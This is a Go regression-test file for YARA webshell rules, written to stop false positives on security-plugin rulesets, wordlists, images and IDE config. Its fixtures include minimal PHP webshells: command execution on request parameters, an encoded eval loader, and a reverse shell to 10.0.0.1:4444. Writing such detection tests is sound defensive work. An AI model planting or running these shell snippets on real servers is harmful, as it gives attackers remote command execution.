//go:build yara

package yara

import "testing"

// Regression tests for the 2026-07-20/21 yara_match_scheduled false-positive
// flood. Single-brand-string webshell rules fired on any file whose raw bytes
// contained the brand: security-plugin signature databases (Wordfence
// wflogs/rules.php, hide-my-wp firewall Rules.php), password wordlists,
// images, archives, and IDE config. The fix requires a PHP open tag plus a
// command/code execution sink in the file, so a file that only CATALOGS the
// brand (or is not PHP at all) is no longer convicted. Real branded shells
// carry both and stay detected. Paths are never allowlisted.

// wordfenceRuleset models Wordfence's generated WAF ruleset: PHP that stores
// attacker fingerprints as wfWAFRuleComparison patterns, with no exec sink.
const wordfenceRuleset = `<?php
if (!defined('WFWAF_VERSION')) { exit('Access denied'); }
$this->add(new wfWAFRule($this, 1001, 'block', 'attackers',
	new wfWAFRuleComparisonGroup(
		new wfWAFRuleComparison($this, 'match', '#^anonymousfox#i',
			array(wfWAFRuleComparisonSubject::create($this, 'getPath'))),
		new wfWAFRuleComparison($this, 'match', '#(?:c99shell|r57shell|b374k)#i',
			array(wfWAFRuleComparisonSubject::create($this, 'getBody'))))));
`

// hideMyWpRuleset models hide-my-wp's firewall Rules.php: a big preg_match
// alternation of attack tokens, no exec sink.
const hideMyWpRuleset = `<?php
class HMW_Model_Rules {
	public function checkPath($uri) {
		if (preg_match('/(mobiquo|muiebl|nessus|osbxamip|phpunit|priv8|qcmpecgy|r3vn330|racrew|raiz0|r00t)/i', $uri)) {
			return true;
		}
		return false;
	}
}
`

func TestFPFlood_WebshellAnonymousfox_WordfenceRuleset(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(wordfenceRuleset)), "webshell_anonymousfox") {
		t.Error("webshell_anonymousfox FP: matched Wordfence WAF ruleset that catalogs the brand")
	}
	mal := []byte(`<?php /* AnonymousFox cPanel reset tool */ if($_GET['fox']){ system($_GET['cmd']); }`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_anonymousfox") {
		t.Error("webshell_anonymousfox regression: real AnonymousFox shell not detected")
	}
}

func TestFPFlood_WebshellC99R57B374k_WordfenceRuleset(t *testing.T) {
	s := loadRepoYaraScanner(t)
	for _, rule := range []string{"webshell_c99", "webshell_r57", "webshell_b374k"} {
		if hasYaraRule(s.ScanBytes([]byte(wordfenceRuleset)), rule) {
			t.Errorf("%s FP: matched Wordfence WAF ruleset that catalogs the brand", rule)
		}
	}
	c99 := []byte(`<?php // c99shell v1.0 pre-release build
$c99sh_sourcesurl = "http://c99.evil/"; passthru($_POST['cmd']);`)
	if !hasYaraRule(s.ScanBytes(c99), "webshell_c99") {
		t.Error("webshell_c99 regression: real c99 shell not detected")
	}
	r57 := []byte(`<?php $r57_language='eng'; echo $r57_logo; eval($_POST['c']);`)
	if !hasYaraRule(s.ScanBytes(r57), "webshell_r57") {
		t.Error("webshell_r57 regression: real r57 shell not detected")
	}
	b374k := []byte(`<?php // b374k 3.2 shell
$b374k = create_function('', gzinflate(base64_decode($payload))); $b374k();`)
	if !hasYaraRule(s.ScanBytes(b374k), "webshell_b374k") {
		t.Error("webshell_b374k regression: real b374k shell not detected")
	}
}

func TestFPFlood_WebshellPriv8_HideMyWpRuleset(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(hideMyWpRuleset)), "webshell_priv8") {
		t.Error("webshell_priv8 FP: matched hide-my-wp firewall rules cataloging the token")
	}
	// The token also appears verbatim inside a binary archive and an image.
	rar := append([]byte("Rar!\x1a\x07\x00"), []byte("pRIv8 header bytes\x00\x01\x02")...)
	if hasYaraRule(s.ScanBytes(rar), "webshell_priv8") {
		t.Error("webshell_priv8 FP: matched brand bytes inside a RAR archive")
	}
	mal := []byte(`<?php /* Priv8 Shell by x */ echo "Priv8 Shell"; shell_exec($_REQUEST['c']);`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_priv8") {
		t.Error("webshell_priv8 regression: real Priv8 shell not detected")
	}
}

func TestFPFlood_WebshellLaudanum_ZxcvbnWordlist(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// zxcvbn-php password frequency list: "laudanum" is an English word.
	wordlist := []byte("landscape 4\nlanguage 5\nlaudanum 6\nlaunch 7\nlaundry 8\n")
	if hasYaraRule(s.ScanBytes(wordlist), "webshell_laudanum") {
		t.Error("webshell_laudanum FP: matched a password wordlist containing the word")
	}
	jsonList := []byte(`{"english_wikipedia":["laterally","laudanum","laughable"]}`)
	if hasYaraRule(s.ScanBytes(jsonList), "webshell_laudanum") {
		t.Error("webshell_laudanum FP: matched a JSON frequency list")
	}
	mal := []byte(`<?php // Laudanum PHP shell collection - php-reverse-shell
$ip='10.0.0.1'; $sock=fsockopen($ip,4444); exec('/bin/sh -i <&3 >&3 2>&3');`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_laudanum") {
		t.Error("webshell_laudanum regression: real Laudanum shell not detected")
	}
}

func TestFPFlood_WebshellP0wny_ImageBytes(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// JPEG whose entropy-coded bytes happen to contain "P0WnY".
	jpeg := append([]byte("\xff\xd8\xff\xe0\x00\x10JFIF\x00"), []byte("scan data P0WnY more scan data \xff\xd9")...)
	if hasYaraRule(s.ScanBytes(jpeg), "webshell_p0wny") {
		t.Error("webshell_p0wny FP: matched brand bytes inside a JPEG")
	}
	mal := []byte(`<?php // p0wny@shell:~# minimalist shell
echo shell_exec($_POST['cmd']);`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_p0wny") {
		t.Error("webshell_p0wny regression: real p0wny-shell not detected")
	}
}

func TestFPFlood_WebshellWso_IdeConfig(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// JetBrains workspace.xml referencing a file named in a FilesMan-like path.
	xml := []byte(`<?xml version="1.0"?><project><component name="FileEditorManager">` +
		`<file url="file://$PROJECT_DIR$/FilesManager.php" /></component></project>`)
	if hasYaraRule(s.ScanBytes(xml), "webshell_wso") {
		t.Error("webshell_wso FP: matched IDE workspace.xml token")
	}
	mal := []byte(`<?php $wso_version="2.5"; // WebShell by oRb - FilesMan
if($_POST['a']=='FilesMan'){ passthru($_POST['c1']); }`)
	if !hasYaraRule(s.ScanBytes(mal), "webshell_wso") {
		t.Error("webshell_wso regression: real WSO shell not detected")
	}
}
